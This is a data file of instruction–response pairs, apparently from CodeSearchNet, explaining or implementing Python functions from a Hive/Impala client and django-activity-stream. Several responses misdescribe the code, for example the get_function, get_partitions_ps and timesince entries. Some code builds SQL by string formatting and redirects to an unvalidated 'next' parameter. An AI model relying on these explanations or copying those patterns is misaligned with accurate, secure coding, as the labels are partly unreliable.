{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_partitions(self, db_name, tbl_name, max_parts):\n    self.send_get_partitions(db_name, tbl_name, max_parts)\n    return self.recv_get_partitions()", "response": "This method returns the last max_parts partitions of a table."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_partitions_with_auth(self, db_name, tbl_name, max_parts, user_name, group_names):\n    self.send_get_partitions_with_auth(db_name, tbl_name, max_parts, user_name, group_names)\n    return self.recv_get_partitions_with_auth()", "response": "This method is used to get the partitions of a table with authentication."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_partition_names(self, db_name, tbl_name, max_parts):\n    self.send_get_partition_names(db_name, tbl_name, max_parts)\n    return self.recv_get_partition_names()", "response": "This method is used to get the partition names of a table."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_partitions_ps(self, db_name, tbl_name, part_vals, max_parts):\n    self.send_get_partitions_ps(db_name, tbl_name, part_vals, max_parts)\n    return self.recv_get_partitions_ps()", "response": "This method is used to get the number of partitions in a table."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_partitions_ps_with_auth(self, db_name, tbl_name, part_vals, max_parts, user_name, group_names):\n    self.send_get_partitions_ps_with_auth(db_name, tbl_name, part_vals, max_parts, user_name, group_names)\n    return self.recv_get_partitions_ps_with_auth()", "response": "This method is used to get the partitions from a table with authentication."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_partitions_by_filter(self, db_name, tbl_name, filter, max_parts):\n    self.send_get_partitions_by_filter(db_name, tbl_name, filter, max_parts)\n    return self.recv_get_partitions_by_filter()", "response": "This method is used to get the partitions of a table by filter."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_partitions_by_names(self, db_name, tbl_name, names):\n    self.send_get_partitions_by_names(db_name, tbl_name, names)\n    return self.recv_get_partitions_by_names()", "response": "This method is used to get partitions by names."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef alter_partition(self, db_name, tbl_name, new_part):\n    self.send_alter_partition(db_name, tbl_name, new_part)\n    self.recv_alter_partition()", "response": "This function is used to send and receive an AlterPartition command to change the partition of the database."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef alter_partitions_with_environment_context(self, db_name, tbl_name, new_parts, environment_context):\n    self.send_alter_partitions_with_environment_context(db_name, tbl_name, new_parts, environment_context)\n    self.recv_alter_partitions_with_environment_context()", "response": "This function is used to send and receive an AlterPartitions command to change the partitions in the database with the given environment context."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef rename_partition(self, db_name, tbl_name, part_vals, new_part):\n    self.send_rename_partition(db_name, tbl_name, part_vals, new_part)\n    self.recv_rename_partition()", "response": "This function is called to send and receive rename_partition command to change the partition value of a table."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_config_value(self, name, defaultValue):\n    self.send_get_config_value(name, defaultValue)\n    return self.recv_get_config_value()", "response": "Get a value from the config file."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef markPartitionForEvent(self, db_name, tbl_name, part_vals, eventType):\n    self.send_markPartitionForEvent(db_name, tbl_name, part_vals, eventType)\n    self.recv_markPartitionForEvent()", "response": "Mark the partition for an event."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef isPartitionMarkedForEvent(self, db_name, tbl_name, part_vals, eventType):\n    self.send_isPartitionMarkedForEvent(db_name, tbl_name, part_vals, eventType)\n    return self.recv_isPartitionMarkedForEvent()", "response": "This method is used to check if a partition is marked for an event."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_index(self, new_index, index_table):\n    self.send_add_index(new_index, index_table)\n    return self.recv_add_index()", "response": "Adds a new index to the index table."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_index_by_name(self, db_name, tbl_name, index_name):\n    self.send_get_index_by_name(db_name, tbl_name, index_name)\n    return self.recv_get_index_by_name()", "response": "This function is used to get the index by name."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_index_names(self, db_name, tbl_name, max_indexes):\n    self.send_get_index_names(db_name, tbl_name, max_indexes)\n    return self.recv_get_index_names()", "response": "This method is used to get the names of all indexes in a table."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_table_column_statistics(self, db_name, tbl_name, col_name):\n    self.send_get_table_column_statistics(db_name, tbl_name, col_name)\n    return self.recv_get_table_column_statistics()", "response": "This method is used to get statistics about a column in a table."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_partition_column_statistics(self, db_name, tbl_name, part_name, col_name):\n    self.send_get_partition_column_statistics(db_name, tbl_name, part_name, col_name)\n    return self.recv_get_partition_column_statistics()", "response": "This method is used to get statistics about the column in a partition."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef delete_partition_column_statistics(self, db_name, tbl_name, part_name, col_name):\n    self.send_delete_partition_column_statistics(db_name, tbl_name, part_name, col_name)\n    return self.recv_delete_partition_column_statistics()", "response": "This method is used to send and receive the partition column statistics."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndropping a function from the database.", "response": "def drop_function(self, dbName, funcName):\n    \"\"\"\n    Parameters:\n     - dbName\n     - funcName\n    \"\"\"\n    self.send_drop_function(dbName, funcName)\n    self.recv_drop_function()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef alter_function(self, dbName, funcName, newFunc):\n    self.send_alter_function(dbName, funcName, newFunc)\n    self.recv_alter_function()", "response": "This function is used to send and receive an Alter Function command to the server."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_functions(self, dbName, pattern):\n    self.send_get_functions(dbName, pattern)\n    return self.recv_get_functions()", "response": "This method is used to get the functions of a database."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_function(self, dbName, funcName):\n    self.send_get_function(dbName, funcName)\n    return self.recv_get_function()", "response": "This method is used to get the value of a function in a series of time."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef grant_role(self, role_name, principal_name, principal_type, grantor, grantorType, grant_option):\n    self.send_grant_role(role_name, principal_name, principal_type, grantor, grantorType, grant_option)\n    return self.recv_grant_role()", "response": "This function is used to grant a role to a group."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nrevokes a role from a group.", "response": "def revoke_role(self, role_name, principal_name, principal_type):\n    \"\"\"\n    Parameters:\n     - role_name\n     - principal_name\n     - principal_type\n    \"\"\"\n    self.send_revoke_role(role_name, principal_name, principal_type)\n    return self.recv_revoke_role()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list_privileges(self, principal_name, principal_type, hiveObject):\n    self.send_list_privileges(principal_name, principal_type, hiveObject)\n    return self.recv_list_privileges()", "response": "This method is used to list the privileges of a user in a HMC."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef set_ugi(self, user_name, group_names):\n    self.send_set_ugi(user_name, group_names)\n    return self.recv_set_ugi()", "response": "This method sends a SET UGI command to the server and returns the response."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_delegation_token(self, token_owner, renewer_kerberos_principal_name):\n    self.send_get_delegation_token(token_owner, renewer_kerberos_principal_name)\n    return self.recv_get_delegation_token()", "response": "This method is used to get a new token from a Delegation Token."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding a token to the list of tokens in the order they were added.", "response": "def add_token(self, token_identifier, delegation_token):\n    \"\"\"\n    Parameters:\n     - token_identifier\n     - delegation_token\n    \"\"\"\n    self.send_add_token(token_identifier, delegation_token)\n    return self.recv_add_token()"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreplaces qmark parameters and numeric markers in the given operation.", "response": "def _replace_numeric_markers(operation, string_parameters):\n    \"\"\"\n    Replaces qname, format, and numeric markers in the given operation, from\n    the string_parameters list.\n\n    Raises ProgrammingError on wrong number of parameters or bindings\n    when using qmark. There is no error checking on numeric parameters.\n    \"\"\"\n    def replace_markers(marker, op, parameters):\n        param_count = len(parameters)\n        marker_index = 0\n        start_offset = 0\n        while True:\n            found_offset = op.find(marker, start_offset)\n            if not found_offset > -1:\n                break\n            if marker_index < param_count:\n                op = op[:found_offset]+op[found_offset:].replace(marker, parameters[marker_index], 1)\n                start_offset = found_offset + len(parameters[marker_index])\n                marker_index += 1\n            else:\n                raise ProgrammingError(\"Incorrect number of bindings \"\n                                       \"supplied. The current statement uses \"\n                                       \"%d or more, and there are %d \"\n                                       \"supplied.\" % (marker_index + 1,\n                                                      param_count))\n        if marker_index != 0 and marker_index != param_count:\n            raise ProgrammingError(\"Incorrect number of bindings \"\n                                   \"supplied. The current statement uses \"\n                                   \"%d or more, and there are %d supplied.\" %\n                                   (marker_index + 1, param_count))\n        return op\n\n    # replace qmark parameters and format parameters\n    operation = replace_markers('?', operation, string_parameters)\n    operation = replace_markers(r'%s', operation, string_parameters)\n\n    # replace numbered parameters\n    # Go through them backwards so smaller numbers don't replace\n    # parts of larger ones\n    for index in range(len(string_parameters), 0, -1):\n        operation = operation.replace(':' + str(index),\n                                      string_parameters[index - 1])\n    return operation"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef build_summary_table(summary, idx, is_fragment_root, indent_level, output):\n    # pylint: disable=too-many-locals\n\n    attrs = [\"latency_ns\", \"cpu_time_ns\", \"cardinality\", \"memory_used\"]\n\n    # Initialise aggregate and maximum stats\n    agg_stats, max_stats = TExecStats(), TExecStats()\n    for attr in attrs:\n        setattr(agg_stats, attr, 0)\n        setattr(max_stats, attr, 0)\n\n    node = summary.nodes[idx]\n    for stats in node.exec_stats:\n        for attr in attrs:\n            val = getattr(stats, attr)\n            if val is not None:\n                setattr(agg_stats, attr, getattr(agg_stats, attr) + val)\n                setattr(max_stats, attr, max(getattr(max_stats, attr), val))\n\n    if len(node.exec_stats) > 0:\n        avg_time = agg_stats.latency_ns / len(node.exec_stats)\n    else:\n        avg_time = 0\n\n    # If the node is a broadcast-receiving exchange node, the cardinality of\n    # rows produced is the max over all instances (which should all have\n    # received the same number of rows). Otherwise, the cardinality is the sum\n    # over all instances which process disjoint partitions.\n    if node.is_broadcast and is_fragment_root:\n        cardinality = max_stats.cardinality\n    else:\n        cardinality = agg_stats.cardinality\n\n    est_stats = node.estimated_stats\n    label_prefix = \"\"\n    if indent_level > 0:\n        label_prefix = \"|\"\n        if is_fragment_root:\n            label_prefix += \"    \" * indent_level\n        else:\n            label_prefix += \"--\" * indent_level\n\n    def prettyprint(val, units, divisor):\n        for unit in units:\n            if val < divisor:\n                if unit == units[0]:\n                    return \"%d%s\" % (val, unit)\n                else:\n                    return \"%3.2f%s\" % (val, unit)\n            val /= divisor\n\n    def prettyprint_bytes(byte_val):\n        return prettyprint(\n            byte_val, [' B', ' KB', ' MB', ' GB', ' TB'], 1024.0)\n\n    def prettyprint_units(unit_val):\n        return prettyprint(unit_val, [\"\", \"K\", \"M\", \"B\"], 1000.0)\n\n    def prettyprint_time(time_val):\n        return prettyprint(time_val, [\"ns\", \"us\", \"ms\", \"s\"], 1000.0)\n\n    row = [label_prefix + node.label,\n           len(node.exec_stats),\n           prettyprint_time(avg_time),\n           prettyprint_time(max_stats.latency_ns),\n           prettyprint_units(cardinality),\n           prettyprint_units(est_stats.cardinality),\n           prettyprint_bytes(max_stats.memory_used),\n           prettyprint_bytes(est_stats.memory_used),\n           node.label_detail]\n\n    output.append(row)\n    try:\n        sender_idx = summary.exch_to_sender_map[idx]\n        # This is an exchange node, so the sender is a fragment root, and\n        # should be printed next.\n        build_summary_table(summary, sender_idx, True, indent_level, output)\n    except (KeyError, TypeError):\n        # Fall through if idx not in map, or if exch_to_sender_map itself is\n        # not set\n        pass\n\n    idx += 1\n    if node.num_children > 0:\n        first_child_output = []\n        idx = build_summary_table(summary, idx, False, indent_level,\n                                  first_child_output)\n        # pylint: disable=unused-variable\n        # TODO: is child_idx supposed to be unused?  See #120\n        for child_idx in range(1, node.num_children):\n            # All other children are indented (we only have 0, 1 or 2 children\n            # for every exec node at the moment)\n            idx = build_summary_table(summary, idx, False, indent_level + 1,\n                                      output)\n        output += first_child_output\n    return idx", "response": "Direct translation of Coordinator :: PrintExecSummary to recursively build a list of rows of summary statistics one per exec node and one per exec node."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cursor(self, user=None, configuration=None, convert_types=True,\n               dictify=False, fetch_error=True):\n        \"\"\"Get a cursor from the HiveServer2 (HS2) connection.\n\n        Parameters\n        ----------\n        user : str, optional\n        configuration : dict of str keys and values, optional\n            Configuration overlay for the HS2 session.\n        convert_types : bool, optional\n            When `False`, timestamps and decimal values will not be converted\n            to Python `datetime` and `Decimal` values. (These conversions are\n            expensive.) Only applies when using HS2 protocol versions > 6.\n        dictify : bool, optional\n            When `True` cursor will return key value pairs instead of rows.\n        batch_cursor : bool, optional\n            When `True` cursor will return CBatches directly rather than rows.\n        fetch_error : bool, optional\n            In versions of impala prior to 2.7.0, when an operation fails and\n            the impalad returns an error state, the error message is not always\n            returned. In these cases the error message can be retrieved by a\n            subsequent fetch rpc call but this has a side effect of invalidating\n            the query handle and causing any further operations against it to\n            fail. e.g. calling log() or profile().\n\n            When set to `True` impyla will attempt to fetch the error message.\n            When set to `False`, this flag will cause impyla not to attempt to\n            fetch the message with a fetch call . In this case the query\n            handle remains valid and impyla will raise an exception with a\n            message of \"Operation is in ERROR_STATE\".\n            The Default option is `True`.\n\n        Returns\n        -------\n        HiveServer2Cursor\n            A `Cursor` object (DB API 2.0-compliant).\n        \"\"\"\n        # PEP 249\n        log.debug('Getting a cursor (Impala session)')\n\n        if user is None:\n            user = getpass.getuser()\n\n        log.debug('.cursor(): getting new session_handle')\n\n        session = self.service.open_session(user, configuration)\n\n        log.debug('HiveServer2Cursor(service=%s, session_handle=%s, '\n                  'default_config=%s, hs2_protocol_version=%s)',\n                  self.service, session.handle,\n                  session.config, session.hs2_protocol_version)\n\n        cursor_class = HiveServer2DictCursor if dictify else HiveServer2Cursor\n\n        cursor = cursor_class(session, convert_types=convert_types,\n                              fetch_error=fetch_error)\n\n        if self.default_db is not None:\n            log.info('Using database %s as default', self.default_db)\n            cursor.execute('USE %s' % self.default_db)\n        return cursor", "response": "Get a cursor from the Impala database."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef execute_async(self, operation, parameters=None, configuration=None):\n        log.debug('Executing query %s', operation)\n\n        def op():\n            if parameters:\n                self._last_operation_string = _bind_parameters(operation,\n                                                               parameters)\n            else:\n                self._last_operation_string = operation\n\n            op = self.session.execute(self._last_operation_string,\n                                      configuration,\n                                      run_async=True)\n            self._last_operation = op\n\n        self._execute_async(op)", "response": "Asynchronously execute a SQL query."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a step function of time to sleep before polling again.", "response": "def _get_sleep_interval(self, start_time):\n        \"\"\"Returns a step function of time to sleep in seconds before polling\n        again. Maximum sleep is 1s, minimum is 0.1s\"\"\"\n        elapsed = time.time() - start_time\n        if elapsed < 0.05:\n            return 0.01\n        elif elapsed < 1.0:\n            return 0.05\n        elif elapsed < 10.0:\n            return 0.1\n        elif elapsed < 60.0:\n            return 0.5\n        return 1.0"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fetchcbatch(self):\n        '''Return a CBatch object of any data currently in the buffer or\n           if no data currently in buffer then fetch a batch'''\n        if not self._last_operation.is_columnar:\n            raise NotSupportedError(\"Server does not support columnar \"\n                                    \"fetching\")\n        if not self.has_result_set:\n            raise ProgrammingError(\n                \"Trying to fetch results on an operation with no results.\")\n        if len(self._buffer) > 0:\n            log.debug('fetchcbatch: buffer has data in. Returning it and wiping buffer')\n            batch = self._buffer\n            self._buffer = Batch()\n            return batch\n        elif self._last_operation_active:\n            log.debug('fetchcbatch: buffer empty and op is active => fetching '\n                      'more data')\n            batch = (self._last_operation.fetch(\n                         self.description,\n                         self.buffersize,\n                         convert_types=self.convert_types))\n            if len(batch) == 0:\n               return None\n            return batch\n        else:\n           return None", "response": "Return a CBatch object of any data currently in the buffer or None if there is no data currently in the buffer or a batch of more data."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fetchcolumnar(self):\n        self._wait_to_finish()\n        if not self._last_operation.is_columnar:\n            raise NotSupportedError(\"Server does not support columnar \"\n                                    \"fetching\")\n        batches = []\n        while True:\n            batch = (self._last_operation.fetch(\n                         self.description,\n                         self.buffersize,\n                         convert_types=self.convert_types))\n            if len(batch) == 0:\n                break\n            batches.append(batch)\n        return batches", "response": "Executes a fetchall operation returning a list of CBatches."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting an option on the", "response": "def setOption(self, key, value):\n    \"\"\"\n    Sets an option\n\n    Parameters:\n     - key\n     - value\n    \"\"\"\n    self.send_setOption(key, value)\n    self.recv_setOption()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef executeAndWait(self, query, clientCtx):\n    self.send_executeAndWait(query, clientCtx)\n    return self.recv_executeAndWait()", "response": "Execute a query synchronously and wait for the response."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the results of a query. This is non-blocking. Caller should check Results.ready to determine if the results are in yet. The call requests the batch size of fetch. Parameters: - query_id - start_over - fetch_size", "response": "def fetch(self, query_id, start_over, fetch_size):\n    \"\"\"\n    Get the results of a query. This is non-blocking. Caller should check\n    Results.ready to determine if the results are in yet. The call requests\n    the batch size of fetch.\n\n    Parameters:\n     - query_id\n     - start_over\n     - fetch_size\n    \"\"\"\n    self.send_fetch(query_id, start_over, fetch_size)\n    return self.recv_fetch()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef post_create_table(self, table):\n\n        table_opts = []\n\n        if 'impala_partition_by' in table.kwargs:\n            table_opts.append('PARTITION BY %s' % table.kwargs.get('impala_partition_by'))\n\n        if 'impala_stored_as' in table.kwargs:\n            table_opts.append('STORED AS %s' % table.kwargs.get('impala_stored_as'))\n\n        if 'impala_table_properties' in table.kwargs:\n            table_properties = [\"'{0}' = '{1}'\".format(property_, value)\n                                for property_, value\n                                in table.kwargs.get('impala_table_properties', {}).items()]\n            table_opts.append('TBLPROPERTIES (%s)' % ', '.join(table_properties))\n        return '\\n%s' % '\\n'.join(table_opts)", "response": "Build table - level CREATE options."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconnecting to a Hive Server 2. 0 HS2 database.", "response": "def connect(host='localhost', port=21050, database=None, timeout=None,\n            use_ssl=False, ca_cert=None, auth_mechanism='NOSASL', user=None,\n            password=None, kerberos_service_name='impala', use_ldap=None,\n            ldap_user=None, ldap_password=None, use_kerberos=None,\n            protocol=None, krb_host=None):\n    \"\"\"Get a connection to HiveServer2 (HS2).\n\n    These options are largely compatible with the impala-shell command line\n    arguments. See those docs for more information.\n\n    Parameters\n    ----------\n    host : str\n        The hostname for HS2. For Impala, this can be any of the `impalad`s.\n    port : int, optional\n        The port number for HS2. The Impala default is 21050. The Hive port is\n        likely different.\n    database : str, optional\n        The default database. If `None`, the result is\n        implementation-dependent.\n    timeout : int, optional\n        Connection timeout in seconds. Default is no timeout.\n    use_ssl : bool, optional\n        Enable SSL.\n    ca_cert : str, optional\n        Local path to the the third-party CA certificate. If SSL is enabled but\n        the certificate is not specified, the server certificate will not be\n        validated.\n    auth_mechanism : {'NOSASL', 'PLAIN', 'GSSAPI', 'LDAP'}\n        Specify the authentication mechanism. `'NOSASL'` for unsecured Impala.\n        `'PLAIN'` for unsecured Hive (because Hive requires the SASL\n        transport). `'GSSAPI'` for Kerberos and `'LDAP'` for Kerberos with\n        LDAP.\n    user : str, optional\n        LDAP user, if applicable.\n    password : str, optional\n        LDAP password, if applicable.\n    kerberos_service_name : str, optional\n        Authenticate to a particular `impalad` service principal. Uses\n        `'impala'` by default.\n    use_ldap : bool, optional\n        Specify `auth_mechanism='LDAP'` instead.\n\n        .. deprecated:: 0.11.0\n    ldap_user : str, optional\n        Use `user` parameter instead.\n\n        .. deprecated:: 0.11.0\n    ldap_password : str, optional\n        Use `password` parameter instead.\n\n        .. deprecated:: 0.11.0\n    use_kerberos : bool, optional\n        Specify `auth_mechanism='GSSAPI'` instead.\n\n        .. deprecated:: 0.11.0\n    protocol : str, optional\n        Do not use.  HiveServer2 is the only protocol currently supported.\n\n        .. deprecated:: 0.11.0\n\n\n    Returns\n    -------\n    HiveServer2Connection\n        A `Connection` object (DB API 2.0-compliant).\n    \"\"\"\n    # pylint: disable=too-many-locals\n    if use_kerberos is not None:\n        warn_deprecate('use_kerberos', 'auth_mechanism=\"GSSAPI\"')\n        if use_kerberos:\n            auth_mechanism = 'GSSAPI'\n\n    if use_ldap is not None:\n        warn_deprecate('use_ldap', 'auth_mechanism=\"LDAP\"')\n        if use_ldap:\n            auth_mechanism = 'LDAP'\n\n    if auth_mechanism:\n        auth_mechanism = auth_mechanism.upper()\n    else:\n        auth_mechanism = 'NOSASL'\n\n    if auth_mechanism not in AUTH_MECHANISMS:\n        raise NotSupportedError(\n            'Unsupported authentication mechanism: {0}'.format(auth_mechanism))\n\n    if ldap_user is not None:\n        warn_deprecate('ldap_user', 'user')\n        user = ldap_user\n\n    if ldap_password is not None:\n        warn_deprecate('ldap_password', 'password')\n        password = ldap_password\n\n    if protocol is not None:\n        if protocol.lower() == 'hiveserver2':\n            warn_protocol_param()\n        else:\n            raise NotSupportedError(\n                \"'{0}' is not a supported protocol; only HiveServer2 is \"\n                \"supported\".format(protocol))\n\n    service = hs2.connect(host=host, port=port,\n                          timeout=timeout, use_ssl=use_ssl,\n                          ca_cert=ca_cert, user=user, password=password,\n                          kerberos_service_name=kerberos_service_name,\n                          auth_mechanism=auth_mechanism, krb_host=krb_host)\n    return hs2.HiveServer2Connection(service, default_db=database)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a Thrift Transport object for the specified socket and host.", "response": "def get_transport(socket, host, kerberos_service_name, auth_mechanism='NOSASL',\n                  user=None, password=None):\n    \"\"\"\n    Creates a new Thrift Transport using the specified auth_mechanism.\n    Supported auth_mechanisms are:\n    - None or 'NOSASL' - returns simple buffered transport (default)\n    - 'PLAIN'  - returns a SASL transport with the PLAIN mechanism\n    - 'GSSAPI' - returns a SASL transport with the GSSAPI mechanism\n    \"\"\"\n    log.debug('get_transport: socket=%s host=%s kerberos_service_name=%s '\n              'auth_mechanism=%s user=%s password=fuggetaboutit', socket, host,\n              kerberos_service_name, auth_mechanism, user)\n\n    if auth_mechanism == 'NOSASL':\n        return TBufferedTransport(socket)\n\n    # Set defaults for PLAIN SASL / LDAP connections.\n    if auth_mechanism in ['LDAP', 'PLAIN']:\n        if user is None:\n            user = getpass.getuser()\n            log.debug('get_transport: user=%s', user)\n        if password is None:\n            if auth_mechanism == 'LDAP':\n                password = ''\n            else:\n                # PLAIN always requires a password for HS2.\n                password = 'password'\n            log.debug('get_transport: password=%s', password)\n        auth_mechanism = 'PLAIN'  # sasl doesn't know mechanism LDAP\n    # Initializes a sasl client\n    from thrift_sasl import TSaslClientTransport\n    try:\n        import sasl  # pylint: disable=import-error\n\n        def sasl_factory():\n            sasl_client = sasl.Client()\n            sasl_client.setAttr('host', host)\n            sasl_client.setAttr('service', kerberos_service_name)\n            if auth_mechanism.upper() in ['PLAIN', 'LDAP']:\n                sasl_client.setAttr('username', user)\n                sasl_client.setAttr('password', password)\n            sasl_client.init()\n            return sasl_client\n    except ImportError:\n        log.warn(\"Unable to import 'sasl'. Fallback to 'puresasl'.\")\n        from impala.sasl_compat import PureSASLClient\n\n        def sasl_factory():\n            return PureSASLClient(host, username=user, password=password,\n                                  service=kerberos_service_name)\n\n    return TSaslClientTransport(sasl_factory, auth_mechanism, socket)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_table_schema_hack(cursor, table):\n    # get the schema of the query result via a LIMIT 0 hack\n    cursor.execute('SELECT * FROM %s LIMIT 0' % table)\n    schema = [tup[:2] for tup in cursor.description]\n    cursor.fetchall()  # resets the state of the cursor and closes operation\n    return schema", "response": "Get the schema of table by talking to Impala\n    table must be a string"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the time of the current time in the current locale.", "response": "def timesince(self, now=None):\n        \"\"\"\n        Shortcut for the ``django.utils.timesince.timesince`` function of the\n        current timestamp.\n        \"\"\"\n        return djtimesince(self.timestamp, now).encode('utf8').replace(b'\\xc2\\xa0', b' ').decode('utf8')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef respond(request, code):\n    redirect = request.GET.get('next', request.POST.get('next'))\n    if redirect:\n        return HttpResponseRedirect(redirect)\n    return type('Response%d' % code, (HttpResponse, ), {'status_code': code})()", "response": "Returns a new HttpResponse with the given response code."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef follow_unfollow(request, content_type_id, object_id, flag, do_follow=True, actor_only=True):\n    ctype = get_object_or_404(ContentType, pk=content_type_id)\n    instance = get_object_or_404(ctype.model_class(), pk=object_id)\n\n    # If flag was omitted in url, None will pass to flag keyword argument\n    flag = flag or ''\n\n    if do_follow:\n        actions.follow(request.user, instance, actor_only=actor_only, flag=flag)\n        return respond(request, 201)   # CREATED\n\n    actions.unfollow(request.user, instance, flag=flag)\n    return respond(request, 204)", "response": "Follows or deletes the relationship between the current user and the current object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef stream(request):\n\n    return render(\n        request,\n        'actstream/actor.html',\n        context={\n            'ctype': ContentType.objects.get_for_model(USER_MODEL),\n            'actor': request.user,\n            'action_list': models.user_stream(request.user)\n        }\n    )", "response": "A view that returns the user s activity stream."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a listing of User s that follow the actor defined by content_type_id object_id.", "response": "def followers(request, content_type_id, object_id, flag):\n    \"\"\"\n    Creates a listing of ``User``s that follow the actor defined by\n    ``content_type_id``, ``object_id``.\n    \"\"\"\n    ctype = get_object_or_404(ContentType, pk=content_type_id)\n    instance = get_object_or_404(ctype.model_class(), pk=object_id)\n    flag = flag or ''\n\n    return render(\n        request,\n        'actstream/followers.html',\n        {\n            'followers': models.followers(instance, flag=flag),\n            'actor': instance,\n        }\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a list of actors that the user is following.", "response": "def following(request, user_id, flag):\n    \"\"\"\n    Returns a list of actors that the user identified by ``user_id``\n    is following (eg who im following).\n    \"\"\"\n    instance = get_object_or_404(USER_MODEL, pk=user_id)\n    flag = flag or ''\n    return render(\n        request,\n        'actstream/following.html',\n        {\n            'following': models.following(instance, flag=flag),\n            'user': instance,\n        }\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef model(request, content_type_id):\n    ctype = get_object_or_404(ContentType, pk=content_type_id)\n    model_class = ctype.model_class()\n    return render(\n        request,\n        'actstream/actor.html',\n        {\n            'action_list': models.model_stream(model_class),\n            'ctype': ctype,\n            'actor': model_class\n        }\n    )", "response": "A view that returns a list of models for the given content type."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a Stream of most recent actions where obj is the actor.", "response": "def actor(self, obj, **kwargs):\n        \"\"\"\n        Stream of most recent actions where obj is the actor.\n        Keyword arguments will be passed to Action.objects.filter\n        \"\"\"\n        check(obj)\n        return obj.actor_actions.public(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a Stream of most recent actions where obj is the target.", "response": "def target(self, obj, **kwargs):\n        \"\"\"\n        Stream of most recent actions where obj is the target.\n        Keyword arguments will be passed to Action.objects.filter\n        \"\"\"\n        check(obj)\n        return obj.target_actions.public(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef action_object(self, obj, **kwargs):\n        check(obj)\n        return obj.action_object_actions.public(**kwargs)", "response": "Return a Stream of most recent actions where obj is the action_object."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef model_actions(self, model, **kwargs):\n        check(model)\n        ctype = ContentType.objects.get_for_model(model)\n        return self.public(\n            (Q(target_content_type=ctype) |\n             Q(action_object_content_type=ctype) |\n             Q(actor_content_type=ctype)),\n            **kwargs\n        )", "response": "Return a generator of all most recent actions by any particular model."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a QuerySet of most recent actions where obj is the actor OR target OR action_object.", "response": "def any(self, obj, **kwargs):\n        \"\"\"\n        Stream of most recent actions where obj is the actor OR target OR action_object.\n        \"\"\"\n        check(obj)\n        ctype = ContentType.objects.get_for_model(obj)\n        return self.public(\n            Q(\n                actor_content_type=ctype,\n                actor_object_id=obj.pk,\n            ) | Q(\n                target_content_type=ctype,\n                target_object_id=obj.pk,\n            ) | Q(\n                action_object_content_type=ctype,\n                action_object_object_id=obj.pk,\n            ), **kwargs)"}
